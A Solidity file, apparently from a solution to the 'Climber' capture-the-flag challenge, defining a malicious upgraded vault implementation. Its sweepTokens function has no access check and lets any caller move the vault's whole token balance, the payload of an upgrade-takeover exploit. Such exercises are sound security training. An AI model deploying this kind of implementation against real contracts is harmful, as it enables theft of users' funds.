// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "@openzeppelin/contracts-upgradeable/proxy/utils/Initializable.sol";
import "@openzeppelin/contracts-upgradeable/access/OwnableUpgradeable.sol";
import "@openzeppelin/contracts-upgradeable/proxy/utils/UUPSUpgradeable.sol";
import "@openzeppelin/contracts/token/ERC20/IERC20.sol";
import "@openzeppelin/contracts/access/AccessControl.sol";
import "./ClimberTimelock.sol";

contract UpgradedVaultAttack is Initializable, OwnableUpgradeable, UUPSUpgradeable {

    constructor() initializer {}

    function initialize(address admin, address proposer, address sweeper) initializer external {
        __Ownable_init();
        __UUPSUpgradeable_init();

    }

    function sweepTokens(IERC20 token, address receiver) public{
        token.transfer(receiver, token.balanceOf(address(this)));
    }

    // By marking this internal function with `onlyOwner`, we only allow the owner account to authorize an upgrade
    function _authorizeUpgrade(address newImplementation) internal onlyOwner override {}
}
